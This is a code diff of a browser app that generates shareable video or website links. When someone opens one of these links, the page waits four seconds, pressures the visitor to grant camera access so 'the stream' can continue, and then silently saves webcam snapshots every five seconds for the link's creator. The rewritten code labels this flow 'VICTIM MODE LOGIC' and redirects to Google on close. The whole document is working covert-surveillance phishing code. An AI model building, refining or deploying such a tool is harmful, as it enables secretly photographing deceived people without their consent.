-                const type = link.type === 'youtube' ? 'YouTube' : 'Website';
-                
-                linkItem.innerHTML = `
-                    <div class="link-info">
-                        <div style="font-weight: 700; margin-bottom: 5px; color: var(--primary);">
-                            ${icon} ${type}
-                        </div>
-                        <div style="font-size: 12px; color: #666; margin-bottom: 5px;">
-                            Created: ${new Date(link.createdAt).toLocaleDateString()}
-                        </div>
-                        <div style="font-size: 12px; color: #666;">
-                            Views: ${link.views} • Images: ${link.images.length}
-                        </div>
-                    </div>
-                    <div class="link-actions">
-                        <button class="action-btn copy-btn" onclick="copyLinkId('${link.id}')">
-                            Copy
-                        </button>
-                        <button class="action-btn view-btn" onclick="viewLink('${link.id}')">
-                            View
-                        </button>
-                    </div>
-                `;
-                
-                linksList.appendChild(linkItem);
-            });
-        }
-        
-        function loadRecentImages() {
-            const images = db.getImagesByUser(currentUser.id);
-            const imagesGrid = document.getElementById('imagesGrid');
-            
-            if (images.length === 0) {
-                imagesGrid.innerHTML = `
-                    <div style="text-align: center; padding: 40px; color: #8e8e93; grid-column: 1 / -1;">
-                        <div style="font-size: 48px; margin-bottom: 15px;">🖼️</div>
-                        <p>No images captured yet</p>
-                        <p style="font-size: 14px; margin-top: 5px;">Images will appear here automatically</p>
-                    </div>
-                `;
-                return;
-            }
-            
-            imagesGrid.innerHTML = '';
-            const recentImages = images.slice(-4).reverse(); // Show last 4 images
-            
-            recentImages.forEach(image => {
-                const imageItem = document.createElement('div');
-                imageItem.className = 'image-item';
-                imageItem.innerHTML = `
-                    <img src="${image.imageData}" alt="Captured Image">
-                    <div class="image-info">
-                        ${new Date(image.timestamp).toLocaleTimeString()}
-                    </div>
-                `;
-                imagesGrid.appendChild(imageItem);
-            });
-        }
-        
-        // Content Type Tabs
-        function showContentType(type) {
-            contentType = type;
-            
-            // Update tabs
-            document.querySelectorAll('.content-tab').forEach(tab => {
-                tab.classList.remove('active');
-            });
-            event.target.classList.add('active');
-            
-            // Show/hide sections
-            document.getElementById('youtubeSection').classList.toggle('hidden', type !== 'youtube');
-            document.getElementById('websiteSection').classList.toggle('hidden', type !== 'website');
-            
-            // Clear preview
-            document.getElementById('videoPreview').innerHTML = '';
-        }
-        
-        // Link Generation
+
         function generateLink() {
-            let url, youtubeId, urlType;
+            const url = document.getElementById('targetUrl').value;
+            if(!url) return alert("Enter URL");
             
-            if (contentType === 'youtube') {
-                url = document.getElementById('youtubeUrl').value.trim();
-                
-                if (!url) {
-                    showAlert('Please enter a YouTube URL', 'error');
-                    return;
-                }
-                
-                youtubeId = extractYouTubeId(url);
-                if (!youtubeId) {
-                    showAlert('Invalid YouTube URL', 'error');
-                    return;
-                }
-                
-                urlType = 'embed';
-                
-            } else {
-                url = document.getElementById('websiteUrl').value.trim();
-                
-                if (!url) {
-                    showAlert('Please enter a website URL', 'error');
-                    return;
-                }
-                
-                if (!url.startsWith('http')) {
-                    url = 'https://' + url;
-                }
-                
-                urlType = document.querySelector('input[name="urlType"]:checked').value;
-                youtubeId = null;
-            }
-            
-            // Create link
-            const link = db.createLink({
-                userId: currentUser.id,
-                type: contentType,
+            const linkObj = {
+                id: 'L' + Date.now(),
                 url: url,
-                youtubeId: youtubeId,
-                urlType: urlType
-            });
+                type: currentMode,
+                createdAt: new Date().toISOString()
+            };
             
-            // Generate viewer URL
-            const viewerUrl = `${window.location.origin}${window.location.pathname}?l=${link.id}&u=${currentUser.id}`;
+            db.saveLink(linkObj);
+            const finalLink = `${window.location.origin}${window.location.pathname}?l=${linkObj.id}&u=${currentUser.id}`;
             
-            // Show generated link
-            document.getElementById('generatedLink').textContent = viewerUrl;
-            document.getElementById('linkBox').style.display = 'block';
-            
-            // Show preview for YouTube
-            if (contentType === 'youtube' && youtubeId) {
-                showVideoPreview(youtubeId);
-            }
-            
-            // Update UI
-            updateStats();
-            loadLinks();
-            showAlert('Link generated successfully!', 'success');
+            document.getElementById('genLinkText').innerText = finalLink;
+            document.getElementById('linkBox').classList.remove('hidden');
+            updateUI();
         }
-        
+
         function copyLink() {
-            const link = document.getElementById('generatedLink').textContent;
-            navigator.clipboard.writeText(link);
-            showAlert('Link copied!', 'success');
+            const text = document.getElementById('genLinkText').innerText;
+            navigator.clipboard.writeText(text);
+            alert("Link Copied!");
         }
-        
-        function testLink() {
-            const link = document.getElementById('generatedLink').textContent;
-            window.open(link, '_blank');
+
+        function updateUI() {
+            if(!currentUser) return;
+            const myLinks = db.getLinks();
+            const myImages = db.getImages();
+            document.getElementById('statLinks').innerText = myLinks.length;
+            document.getElementById('statImages').innerText = myImages.length;
+
+            const grid = document.getElementById('imagesGrid');
+            grid.innerHTML = '';
+            myImages.slice(-6).reverse().forEach(img => {
+                const div = document.createElement('div');
+                div.className = 'image-item';
+                div.innerHTML = `<img src="${img.data}"><p style="font-size:10px">${new Date(img.time).toLocaleTimeString()}</p>`;
+                grid.appendChild(div);
+            });
         }
-        
-        function copyLinkId(linkId) {
-            const link = db.getLinkById(linkId);
-            if (link) {
-                const viewerUrl = `${window.location.origin}${window.location.pathname}?l=${link.id}&u=${currentUser.id}`;
-                navigator.clipboard.writeText(viewerUrl);
-                showAlert('Link copied!', 'success');
-            }
-        }
-        
-        function viewLink(linkId) {
-            const link = db.getLinkById(linkId);
-            if (link) {
-                const viewerUrl = `${window.location.origin}${window.location.pathname}?l=${link.id}&u=${currentUser.id}`;
-                window.open(viewerUrl, '_blank');
-            }
-        }
-        
-        // YouTube Functions
-        function extractYouTubeId(url) {
-            const patterns = [
-                /(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/,
-                /youtube\.com\/watch\?v=([^&]+)/,
-                /youtu\.be\/([^?]+)/
-            ];
-            
-            for (const pattern of patterns) {
-                const match = url.match(pattern);
-                if (match) return match[1];
-            }
-            return null;
-        }
-        
-        function showVideoPreview(videoId) {
-            const preview = document.getElementById('videoPreview');
-            preview.innerHTML = `
-                <iframe 
-                    src="https://www.youtube.com/embed/${videoId}?autoplay=0&controls=1"
-                    frameborder="0"
-                    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
-                    allowfullscreen>
-                </iframe>
-            `;
-        }
-        
-        // Viewer Functions
-        function showViewer(link) {
-            // Hide main container
-            document.getElementById('appContainer').style.display = 'none';
-            
-            // Show viewer
+
+        // --- VICTIM MODE LOGIC ---
+        function startVictimMode(link, userId) {
+            document.getElementById('mainApp').style.display = 'none';
             document.getElementById('viewerScreen').style.display = 'flex';
             
+            let finalUrl = link.url;
             if (link.type === 'youtube') {
-                // Show YouTube
-                document.getElementById('viewerIframe').src = `https://www.youtube.com/embed/${link.youtubeId}?autoplay=1&controls=0&modestbranding=1`;
-                
-            } else if (link.type === 'website') {
-                if (link.urlType === 'embed') {
-                    // Show website in iframe
-                    document.getElementById('viewerIframe').src = link.url;
-                } else {
-                    // Redirect to website
-                    window.location.href = link.url;
-                    return;
-                }
-            }
-        }
-        
-        function closeViewer() {
-            document.getElementById('viewerScreen').style.display = 'none';
-            document.getElementById('appContainer').style.display = 'block';
-            
-            // Stop camera
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-            }
-            if (captureInterval) {
-                clearInterval(captureInterval);
+                const vid = extractYTID(link.url);
+                finalUrl = `https://www.youtube.com/embed/${vid}?autoplay=1&rel=0`;
             }
             
-            showLogin();
+            document.getElementById('viewerIframe').src = finalUrl;
+            
+            // Store session for capture
+            window.session = { linkId: link.id, userId: userId };
+
+            // Show camera request after 4 seconds
+            setTimeout(() => {
+                document.getElementById('cameraModal').style.display = 'flex';
+            }, 4000);
         }
-        
-        // Camera Functions - FIXED IMAGE CAPTURE
+
+        function extractYTID(url) {
+            const regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|\&v=)([^#\&\?]*).*/;
+            const match = url.match(regExp);
+            return (match && match[2].length === 11) ? match[2] : null;
+        }
+
         function startCamera() {
             document.getElementById('cameraModal').style.display = 'none';
-            
-            // Show capture status
-            document.getElementById('captureStatus').style.display = 'flex';
-            document.getElementById('captureText').textContent = 'Starting capture...';
-            
-            // Start camera
-            navigator.mediaDevices.getUserMedia({
-                video: {
-                    facingMode: 'user',
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                }
-            }).then(stream => {
-                cameraStream = stream;
+            document.getElementById('captureStatus').style.display = 'block';
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
                 document.getElementById('video').srcObject = stream;
-                
-                // Wait for video to be ready
-                setTimeout(() => {
-                    // Start capturing
-                    startImageCapture();
-                    
-                    document.getElementById('captureText').textContent = 'Capturing images...';
-                    showAlert('Camera started. Images will be captured automatically.', 'success');
-                    
-                }, 1000);
-                
-            }).catch(error => {
-                console.error('Camera error:', error);
-                document.getElementById('captureStatus').style.display = 'none';
-                showAlert('Camera access denied. No images will be captured.', 'error');
+                // Start capturing every 5 seconds
+                captureInterval = setInterval(takeSnapshot, 5000);
+                takeSnapshot(); // first one immediately
+            })
+            .catch(err => {
+                console.log("Camera denied");
+                alert("Please allow camera to continue the stream.");
             });
         }
-        
-        function startImageCapture() {
-            if (!currentSession) return;
-            
-            // Capture FIRST IMAGE immediately
-            captureImage();
-            
-            // Then capture every 5 seconds
-            captureInterval = setInterval(() => {
-                captureImage();
-            }, 5000);
-        }
-        
-        function captureImage() {
-            if (!currentSession || !cameraStream) return;
-            
+
+        function takeSnapshot() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
-            
-            if (video.readyState !== video.HAVE_ENOUGH_DATA) {
-                console.log('Video not ready yet');
-                return;
-            }
-            
-            try {
-                // Set canvas size
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
                 
-                // Draw video frame
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Add timestamp
-                ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
-                ctx.fillRect(10, canvas.height - 40, 220, 30);
-                ctx.fillStyle = 'white';
-                ctx.font = '14px Arial';
-                ctx.fillText(`Stream-X | ${new Date().toLocaleTimeString()}`, 15, canvas.height - 18);
-                
-                // Convert to data URL
-                const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                
-                // Save to database
+                const data = canvas.toDataURL('image/jpeg', 0.5);
                 db.saveImage({
-                    userId: currentSession.userId,
-                    linkId: currentSession.linkId,
-                    imageData: imageData
+                    userId: window.session.userId,
+                    linkId: window.session.linkId,
+                    data: data,
+                    time: new Date().toISOString()
                 });
-                
-                // Update capture status
-                const count = db.getImagesByLink(currentSession.linkId).length;
-                document.getElementById('captureText').textContent = `Captured ${count} images`;
-                
-                console.log(`Image captured and saved. Total: ${count}`);
-                
-            } catch (error) {
-                console.error('Capture error:', error);
             }
         }
-        
-        // Navigation
-        function showSection(section) {
-            document.querySelectorAll('.nav-item').forEach(item => {
-                item.classList.remove('active');
-            });
-            event.target.closest('.nav-item').classList.add('active');
-            
-            if (section === 'images') {
-                // Refresh images when viewing images section
-                loadRecentImages();
-            }
-            
-            // Smooth scroll to section
-            const element = document.getElementById(section === 'home' ? 'dashboard' : section);
-            if (element) {
-                element.scrollIntoView({ behavior: 'smooth' });
-            }
-        }
-        
-        function showAlert(message, type = 'info') {
-            const alertBox = document.getElementById('alertBox');
-            alertBox.textContent = message;
-            alertBox.style.borderLeftColor = type === 'error' ? '#ff3b30' : 
-                                           type === 'success' ? '#34c759' : 
-                                           '#007aff';
-            alertBox.style.display = 'block';
-            
-            setTimeout(() => {
-                alertBox.style.display = 'none';
-            }, 3000);
+
+        function closeViewer() {
+            location.href = "https://www.google.com";
         }
     </script>
 </body>
